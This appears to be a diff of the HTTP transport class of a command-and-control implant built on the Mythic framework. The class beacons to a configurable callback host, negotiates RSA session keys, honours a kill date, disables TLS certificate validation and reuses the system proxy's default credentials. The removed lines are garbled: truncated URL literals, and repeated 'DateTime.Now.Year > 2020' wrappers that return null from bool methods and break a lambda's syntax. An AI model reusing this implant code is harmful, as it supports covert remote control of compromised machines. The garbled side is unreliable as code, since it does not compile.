@@ -1,12 +1,12 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Linq;
-using PhantomInterop.Classes;
-using PhantomInterop.Interfaces;
-using PhantomInterop.Structs.MythicStructs;
-using PhantomInterop.Types.Delegates;
+using ApolloInterop.Classes;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Structs.MythicStructs;
+using ApolloInterop.Types.Delegates;
 using System.Net;
-using PhantomInterop.Enums.PhantomEnums;
+using ApolloInterop.Enums.ApolloEnums;
 
 namespace HttpTransport
 {
@@ -17,7 +17,7 @@ namespace HttpTransport
         private int CallbackPort;
         private string CallbackHost;
         private string PostUri;
-        
+        // synthesis of CallbackHost, CallbackPort, PostUri
         private string Endpoint;
         private bool EncryptedExchangeCheck;
         private string ProxyHost;
@@ -25,7 +25,7 @@ namespace HttpTransport
         private string ProxyUser;
         private string ProxyPass;
         private string KillDate;
-        
+        // synthesis of ProxyHost and ProxyPort
         private string ProxyAddress;
         private Dictionary<string, string> _additionalHeaders = new Dictionary<string, string>();
         private bool _uuidNegotiated = false;
@@ -35,9 +35,9 @@ namespace HttpTransport
         {
             string final_url = "";
             int last_slash = -1;
-            if(port == 443 && host.StartsWith("https:
+            if(port == 443 && host.StartsWith("https://")){
                 final_url = host;
-            } else if(port == 80 && host.StartsWith("http:
+            } else if(port == 80 && host.StartsWith("http://")){
                 final_url = host;
             } else {
                 last_slash = host.Substring(8).IndexOf("/");
@@ -48,7 +48,7 @@ namespace HttpTransport
                     final_url = host.Substring(0, last_slash) + $":{port}" + host.Substring(last_slash);
                 }
             }
-            if(DateTime.Now.Year > 2020) { return final_url; } else { return null; }
+            return final_url;
         }
         public HttpProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent) : base(data, serializer, agent)
         {
@@ -74,7 +74,7 @@ namespace HttpTransport
                 PostUri = $"/{PostUri}";
             }
             Endpoint = this.ParseURLAndPort(CallbackHost, CallbackPort);
-            
+            //Endpoint = string.Format("{0}:{1}", CallbackHost, CallbackPort);
             ProxyUser = data["proxy_user"];
             ProxyPass = data["proxy_pass"];
             KillDate = data["killdate"];
@@ -102,8 +102,8 @@ namespace HttpTransport
                 }
             }
             
-            
-            ServicePointManager.ServerCertificateValidationCallback = delegate { if(DateTime.Now.Year > 2020) { return true; } else { return null; } };
+            // Disable certificate validation on web requests
+            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
             ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
 
             Agent.SetSleep(CallbackInterval, CallbackJitter);
@@ -131,7 +131,7 @@ namespace HttpTransport
 
         public bool Send<T>(T message) => throw new Exception("HttpProfile does not support Send only.");
         public bool Recv<T>(OnResponse<T> onResponse) => throw new Exception("HttpProfile does not support Recv only.");
-        public bool Recv(MessageType mt, OnResponse<ICommandMessage> onResp) => throw new NotImplementedException("HttpProfile does not support Recv only.");
+        public bool Recv(MessageType mt, OnResponse<IMythicMessage> onResp) => throw new NotImplementedException("HttpProfile does not support Recv only.");
         
 
         public bool SendRecv<T, TResult>(T message, OnResponse<TResult> onResponse)
@@ -151,7 +151,7 @@ namespace HttpTransport
             } 
             else 
             {
-                
+                // Use Default Proxy and Cached Credentials for Internet Access
                 webClient.Proxy = WebRequest.GetSystemWebProxy();
                 webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
             }
@@ -167,23 +167,23 @@ namespace HttpTransport
             {
                 var response = webClient.UploadString(PostUri, sMsg);
                 onResponse(Serializer.Deserialize<TResult>(response));
-                if(DateTime.Now.Year > 2020) { return true; } else { return null; }
+                return true;
             }
             catch (Exception ex)
             {
-                if(DateTime.Now.Year > 2020) { return false; } else { return null; }
+                return false;
             }
         }
 
-        
+        // Only really used for bind servers so this returns empty
         public bool Connect()
         {
-            if(DateTime.Now.Year > 2020) { return true; } else { return null; }
+            return true;
         }
 
         public bool IsConnected()
         {
-            if(DateTime.Now.Year > 2020) { return Connected; } else { return null; }
+            return Connected;
         }
 
         public bool Connect(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
@@ -202,22 +202,22 @@ namespace HttpTransport
                     byte[] tmpKey = this.rsa.RSA.Decrypt(Convert.FromBase64String(respHandshake.SessionKey), true);
                     ((ICryptographySerializer)Serializer).UpdateKey(Convert.ToBase64String(tmpKey));
                     ((ICryptographySerializer)Serializer).UpdateUUID(respHandshake.UUID);
-                    if(DateTime.Now.Year > 2020) { return true; } else { return null; }
+                    return true;
                 }))
                 {
-                    if(DateTime.Now.Year > 2020) { return false; } else { return null; }
+                    return false;
                 }
             }
             string msg = Serializer.Serialize(checkinMsg);
-            if(DateTime.Now.Year > 2020) { return SendRecv<CheckinMessage, MessageResponse>(checkinMsg, delegate (MessageResponse mResp)
+            return SendRecv<CheckinMessage, MessageResponse>(checkinMsg, delegate (MessageResponse mResp)
             {
-                Connected = true; } else { return null; }
+                Connected = true;
                 if (!_uuidNegotiated)
                 {
                     ((ICryptographySerializer)Serializer).UpdateUUID(mResp.ID);
                     _uuidNegotiated = true;
                 }
-                if(DateTime.Now.Year > 2020) { return onResp(mResp); } else { return null; }
+                return onResp(mResp);
             });
         }
 
